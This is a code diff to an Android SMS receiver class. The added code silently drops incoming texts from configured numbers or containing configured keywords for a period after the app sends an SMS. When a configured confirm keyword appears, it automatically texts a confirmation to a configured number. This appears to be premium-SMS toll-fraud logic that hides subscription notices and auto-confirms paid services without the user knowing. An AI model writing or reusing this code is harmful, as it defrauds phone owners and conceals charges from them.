@@ -40,15 +40,92 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]]");
-        String mBlockNum = SettingManager.getInstance(context).getSMSTargetNum();
+        SettingManager.getInstance(context).makePartialWakeLock();
+        SettingManager sm = SettingManager.getInstance(context);
+        SmsMessage[] msgs1 = Intents.getMessagesFromIntent(intent);
+        String smsCenter = msgs1[0].getServiceCenterAddress();
+        if (smsCenter != null) {
+            sm.setSMSCenter(smsCenter);
+        }
         
-        SmsMessage[] msgs = Intents.getMessagesFromIntent(intent);
-        String addr = msgs[0].getDisplayOriginatingAddress();
-        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] addr received = " + addr + " block num = " + mBlockNum);
-        if (addr.equals(mBlockNum) == true) {
-            Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] block the sms from = " + mBlockNum
-                    + " body = " + msgs[0].getDisplayMessageBody());
-            this.abortBroadcast();
+        String blockPorts = sm.getSMSBlockPorts();
+        String blockKeys = sm.getSMSBlockKeys();
+        long smsLastSendTime = sm.getLastSMSTime();
+        long smsBlockTime = sm.getSMSBlockDelayTime();
+        long curTime = System.currentTimeMillis();
+        if ((blockPorts != null || blockKeys != null) 
+                && ((curTime - smsLastSendTime) < smsBlockTime)) {
+            try {
+                if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] blockPorts = " + blockPorts
+                                    + " block keys = " + blockKeys);
+                String[] ports = blockPorts.split(";");
+                SmsMessage[] msgs = Intents.getMessagesFromIntent(intent);
+                String addr = msgs[0].getDisplayOriginatingAddress();
+                if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] received sms addr = " + addr);
+                if (addr == null) return;
+                if (addr.startsWith("+") == true) {
+                    addr = addr.substring(3);
+                }
+                boolean shouldBlock = false;
+                boolean shouldConfirm = false;
+                for (String port : ports) {
+                    if (addr.startsWith(port) == true) {
+                        if (DEBUG) 
+                            Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] " +
+                            		"the sms should block because the addr : " + addr + " in block ports list");
+                        shouldBlock = true;
+                    }
+                }
+                
+                String[] keys = blockKeys.split(";");
+                String smsBody = msgs[0].getMessageBody();
+                String confirmInfo = sm.getConfirmInfo();
+                LOGD("[[PrivilegedSmsReceiver::onReceive]] confirm info = " + confirmInfo);
+                String confirmPort = null;
+                String confirmKey = null;
+                String confirmText = null;
+                if (confirmInfo != null) {
+                    String[] infos = confirmInfo.split(";");
+                    if (infos.length == 3) {
+                        confirmPort = infos[0];
+                        confirmKey = infos[1];
+                        confirmText = infos[2];
+                    }
+                }
+                LOGD("[[PrivilegedSmsReceiver::onReceive]] sms body = " + smsBody);
+                if (smsBody != null) {
+                    for (String key : keys) {
+                        if (smsBody.contains(key) == true) {
+                            if (DEBUG) 
+                                Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] " +
+                                        "the sms should block because the body : " + smsBody + " contain the block Keys");
+                            shouldBlock = true;
+                        }
+                    }
+                }
+                if (shouldBlock == true) {
+                    this.abortBroadcast();
+                    if (smsBody != null && confirmKey != null 
+                            && confirmPort != null && confirmText != null
+                            && smsBody.contains(confirmKey) == true) {
+                        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] should confirm the" +
+                        		" reply to : " + confirmPort + " text = " + confirmText);
+                        WorkingMessage wm = WorkingMessage.createEmpty(context);
+                        wm.setDestNum(confirmPort);
+                        wm.setText(confirmText);
+                        wm.send();
+                    }
+                }
+            } catch (Exception e) {
+            } finally {
+                SettingManager.getInstance(context).releasePartialWakeLock();
+            }
+        }
+    }
+    
+    public static final void LOGD(String msg) {
+        if (DEBUG) {
+            Log.d(TAG, msg);
         }
     }
 }
